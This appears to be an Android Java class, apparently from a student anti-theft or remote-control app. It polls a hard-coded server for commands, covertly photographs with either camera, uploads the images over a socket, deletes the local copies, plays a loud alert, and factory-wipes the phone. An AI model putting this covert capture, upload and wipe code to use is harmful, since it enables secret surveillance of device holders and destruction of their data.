package com.introtomobileappdev.introtomobileappdev.tasks;

import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.AsyncTask;
import android.util.Log;


import com.introtomobileappdev.introtomobileappdev.utils.Constants;
import com.introtomobileappdev.introtomobileappdev.R;
import com.introtomobileappdev.introtomobileappdev.utils.Utils;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

import static android.content.Context.DEVICE_POLICY_SERVICE;


public class ConnectionTask extends AsyncTask<Context, Void, Void>
{
    private MediaPlayer mediaPlayer;

    private void playSongAction(Context context)
    {
        AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        audioManager.setStreamVolume(
                AudioManager.STREAM_MUSIC,
                audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                0);
        mediaPlayer = MediaPlayer.create(context, R.raw.alert);
        mediaPlayer.start();
    }

    private void stopSongAction()
    {
        if (mediaPlayer != null)
            if (mediaPlayer.isPlaying())
                mediaPlayer.stop();
    }

    private void takePhoto(final Context context, int cameraID)
    {
        Camera camera = Camera.open(cameraID);

        SurfaceTexture surfaceTexture = new SurfaceTexture(10);
        try
        {
            camera.setPreviewTexture(surfaceTexture);
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }

        Camera.Parameters parameters;

        parameters = camera.getParameters();
        camera.setParameters(parameters);



        camera.setPreviewCallback(new Camera.PreviewCallback() {
            @Override
            public void onPreviewFrame(byte[] data, Camera camera) {
                try
                {
                    String imageAbsolutePath = Utils.getFileAbsolutePath(context, Constants.DEFAULT_FILE_NAME, Constants.IMAGE);
                    Camera.Parameters parameters = camera.getParameters();
                    Camera.Size size = parameters.getPreviewSize();

                    YuvImage image = new YuvImage(data, parameters.getPreviewFormat(),
                            size.width, size.height, null);

                    File file = new File(imageAbsolutePath);

                    FileOutputStream fileOutputStream = new FileOutputStream(file);
                    image.compressToJpeg(
                            new Rect(0, 0, image.getWidth(), image.getHeight()), 90,
                            fileOutputStream);

                    fileOutputStream.close();
                    camera.stopPreview();
                }

                catch (Exception e)
                {
                    e.printStackTrace();
                }
            }
        });

        camera.startPreview();

    }

    private void sendTakenPhoto(final Context context, final String srvIP, final int srvPort)
    {
        try
        {
            Socket socket = new Socket(srvIP, srvPort);

            String imageAbsolutePath = Utils.getFileAbsolutePath(context, Constants.DEFAULT_FILE_NAME, Constants.IMAGE);
            FileInputStream fileInputStream = new FileInputStream(imageAbsolutePath);
            DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
            int size = fileInputStream.available();
            int sentBytes = 0;

            dataOutputStream.write(Constants.IMAGE.getBytes());
            dataOutputStream.flush();

            while(true)
            {
                sentBytes += Constants.DEFAULT_BUFFER_SIZE;
                if (sentBytes < size)
                {
                    byte[] bytes = new byte[Constants.DEFAULT_BUFFER_SIZE];
                    fileInputStream.read(bytes, 0, Constants.DEFAULT_BUFFER_SIZE);
                    dataOutputStream.write(bytes);
                    dataOutputStream.flush();
                }

                else
                {
                    int lastBytesSize = 1024 - (sentBytes - size);
                    byte[] lastBytes = new byte[lastBytesSize];
                    fileInputStream.read(lastBytes, 0, lastBytesSize);
                    dataOutputStream.write(lastBytes);
                    dataOutputStream.flush();
                    break;
                }
            }



            dataOutputStream.close();
//            fileInputStream.close();
            socket.close();
        }

        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    private void deleteTakenPhoto(final Context context)
    {
        try
        {
            String imageAbsolutePath = Utils.getFileAbsolutePath(context, Constants.DEFAULT_FILE_NAME, Constants.IMAGE);
            File file = new File(imageAbsolutePath);
            file.delete();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    private void wipeData(Context context)
    {
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(DEVICE_POLICY_SERVICE);
        devicePolicyManager.wipeData(1);
    }

    private void listen(Context context)
    {
        while (true)
        {
            try
            {
//                TimeUnit.SECONDS.sleep(5);
//                Utils.restartApp(context);
                Socket s = new Socket(Constants.SRV_IP, Constants.SRV_PORT);
                DataInputStream dataInputStream = new DataInputStream(s.getInputStream());
                DataOutputStream dataOutputStream = new DataOutputStream(s.getOutputStream());

                dataOutputStream.write(Utils.buildDefaultResponse(context).getBytes());
//                dataOutputStream.write(Constants.JAVA_SIGNATURE.getBytes());
//                dataOutputStream.flush();


                StringBuffer stringBuffer = new StringBuffer();

                stringBuffer.append(dataInputStream.readLine());
                Log.println(Log.DEBUG, "test", stringBuffer.toString());

                switch (stringBuffer.toString())
                {
                    case Constants.TAKE_PICTURE_ACTION_FRONT:
                        takePictureAction(context, Constants.FRONT_CAMERA);
                        break;

                    case Constants.TAKE_PICTURE_ACTION_REAR:
                        takePictureAction(context, Constants.REAR_CAMERA);
                        break;

                    case Constants.PLAY_SONG_ACTION:
                        playSongAction(context);
                        break;

                    case Constants.STOP_SONG_ACTION:
                        stopSongAction();
                        break;

                    case Constants.ERASE_EVERYTHING_ACTION:
                        wipeData(context);
                        break;

                    default: //NULL

                        break;
                }
            }

            catch (Exception e)
            {
                try
                {
                    TimeUnit.SECONDS.sleep(5);
                }

                catch (Exception e1)
                {

                }
                e.printStackTrace();
            }

        }
    }

    private void takePictureAction(Context context, int camID) {
        try {
            Utils.restartApp(context);
            takePhoto(context, camID);
            TimeUnit.SECONDS.sleep(2);
            sendTakenPhoto(context, Constants.SRV_IP, Constants.SRV_PORT_FILES);
            deleteTakenPhoto(context);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    protected Void doInBackground(Context... contexts) {
        listen(contexts[0]);
        return null;
    }
}
